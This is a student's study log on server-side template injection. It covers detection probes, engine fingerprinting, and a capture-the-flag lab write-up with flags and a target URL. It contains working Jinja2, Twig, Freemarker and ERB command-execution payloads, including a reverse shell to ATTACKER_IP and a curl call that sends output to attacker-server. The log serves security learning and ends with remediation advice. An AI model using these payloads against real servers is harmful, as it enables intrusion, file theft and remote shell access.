# Day 18 – Saturday | Server-Side Template Injection (SSTI)

**Topic:** Detection & Fingerprinting, Common RCE Payloads, Template Engines
**Date:** Saturday, May 17, 2026

---

## What is SSTI?

Server-Side Template Injection (SSTI) occurs when user-controlled input is embedded **directly into a server-side template** and evaluated by the template engine instead of being treated as plain text.

Template engines such as Jinja2, Twig, Freemarker, and ERB are designed to render dynamic content using expressions like:

```jinja
{{ variable }}
```

or

```erb
<%= value %>
```

If attacker input becomes part of the template itself, the engine may interpret it as executable template code, leading to arbitrary expression evaluation and potentially Remote Code Execution (RCE).

---

## How SSTI Happens

### Safe Usage

```python
template = "Hello, {{ name }}!"
render(template, name=user_input)
```

In this case, `user_input` is passed as data and is never interpreted as template code.

---

### Vulnerable Usage

```python
template = f"Hello, {user_input}!"
render(template)
```

Here, the attacker input becomes part of the template string itself.

Example:

```jinja
{{7*7}}
```

* Safe version → outputs literally:

```text
{{7*7}}
```

* Vulnerable version → evaluated by the engine:

```text
49
```

---

## Detection & Fingerprinting

### Step 1 – Arithmetic Probes

| Payload      | Expected Output | Possible Engine       |
| ------------ | --------------- | --------------------- |
| `{{7*7}}`    | `49`            | Jinja2 / Twig         |
| `${7*7}`     | `49`            | Freemarker / Velocity |
| `<%= 7*7 %>` | `49`            | ERB (Ruby)            |
| `#{7*7}`     | `49`            | Pebble / Smarty       |

These probes help determine whether user input is being interpreted by a template engine.

---

### Step 2 – Engine Fingerprinting

Payload:

```jinja
{{7*'7'}}
```

Results:

* **Jinja2** → `7777777`
* **Twig** → `49`

Reason:

* Jinja2 treats `'7'` as a string and repeats it 7 times
* Twig converts the string to an integer before multiplication

---

## SSTI Fingerprinting Flow

```text
Does {{7*7}} return 49?
│
├── Yes
│   ├── Does {{7*'7'}} return 7777777?
│   │      └── Likely Jinja2 (Python)
│   │
│   └── Does {{7*'7'}} return 49?
│          └── Likely Twig (PHP)
│
└── No
    ├── Try ${7*7}
    ├── Try #{7*7}
    └── Try <%= 7*7 %>
```

---

## Exploitation – Jinja2 (Python / Flask)

### Why `config` Is Useful

Flask automatically exposes several objects to Jinja2 templates, including `config`.

Because `config` is a Python object, attackers may be able to traverse Python internals and access dangerous modules such as `os`.

---

## Payload Chain Breakdown

```jinja
{{ config.__class__
         .__init__
         .__globals__
         ['os']
         .popen('id')
         .read() }}
```

### Breakdown

| Component          | Purpose                                        |
| ------------------ | ---------------------------------------------- |
| `config.__class__` | Accesses Flask `Config` class                  |
| `.__init__`        | References constructor method                  |
| `.__globals__`     | Accesses global variables used by the function |
| `['os']`           | Retrieves Python `os` module                   |
| `.popen('id')`     | Executes OS command                            |
| `.read()`          | Returns command output                         |

---

## Common Jinja2 RCE Payloads

### Confirm Command Execution

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### List Directories

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}
```

### Read Files

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
```

### Reverse Shell (Conceptual Example)

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1').read() }}
```
---

## Alternative Enumeration Technique

If `config` is unavailable:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

This enumerates Python subclasses and may expose useful classes related to:

* file access
* process execution
* subprocess handling

Attackers often inspect the returned classes to locate execution primitives.

---

## Exploitation – Other Template Engines

### Twig (PHP)

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

---

### Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("id") }
```

---

### ERB (Ruby)

```erb
<%= `id` %>
```

---

## Blind SSTI

Some applications evaluate templates but do not display the output.

In these situations, attackers may use out-of-band (OOB) interactions:

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('curl http://attacker-server/?x=$(id)').read() }}
```

Even if the webpage shows nothing, the external server receives the request and confirms code execution.

---

## Attack Chain – ReportGen v2.1 Lab

| Step | Action                                         | Result                                     |
| ---- | ---------------------------------------------- | ------------------------------------------ |
| 1    | Injected `{{7*7}}` into `name` parameter       | Response returned `49`                     |
| 2    | Tested `{{7*'7'}}`                             | Output confirmed Jinja2                    |
| 3    | Enumerated filesystem using `os.popen('ls /')` | Root directories exposed                   |
| 4    | Located `/home` and `/root`                    | Sensitive files identified                 |
| 5    | Retrieved user flag                            | `flag{ssti_jinja2_rce_template_injection}` |
| 6    | Retrieved root flag                            | `flag{root_via_sudo_find}`                 |

### Target Format

```text
http://45.56.112.197:30561/report?name={{PAYLOAD}}
```

---

## Impact of SSTI

Successful SSTI frequently results in **Remote Code Execution (RCE)**.

Potential attacker capabilities include:

* Reading sensitive files
* Accessing credentials and API keys
* Executing operating system commands
* Establishing persistence or reverse shells
* Pivoting into internal infrastructure

Because SSTI can directly lead to server compromise, it is commonly rated **Critical severity**.

---

## Remediation & Defensive Measures

| Defense                                  | Description                                            |
| ---------------------------------------- | ------------------------------------------------------ |
| Never render raw user input as templates | Treat user input strictly as data                      |
| Use sandboxed environments               | Restrict access to dangerous objects and attributes    |
| Input validation                         | Filter template syntax such as `{{`, `${`, `{%`        |
| Remove dangerous globals                 | Restrict modules like `os`, `subprocess`, and builtins |
| Principle of least privilege             | Run applications with minimal permissions              |
| Secure framework configuration           | Disable debug features and unsafe rendering paths      |

---

## Key Takeaways

* SSTI occurs when user input is evaluated as template code
* Arithmetic probes are useful for detection and engine fingerprinting
* Jinja2 SSTI can often escalate into full Python object traversal
* SSTI commonly leads to RCE and full server compromise
* Proper separation of templates and user data is the primary defense

---

## Activities

* Conducted SSTI research and presented findings during class discussion
* Completed the **ReportGen v2.1** lab challenge
* Confirmed Jinja2 SSTI through arithmetic fingerprinting
* Achieved RCE through Flask/Jinja2 object traversal
* Retrieved both user and root flags during exploitation exercise

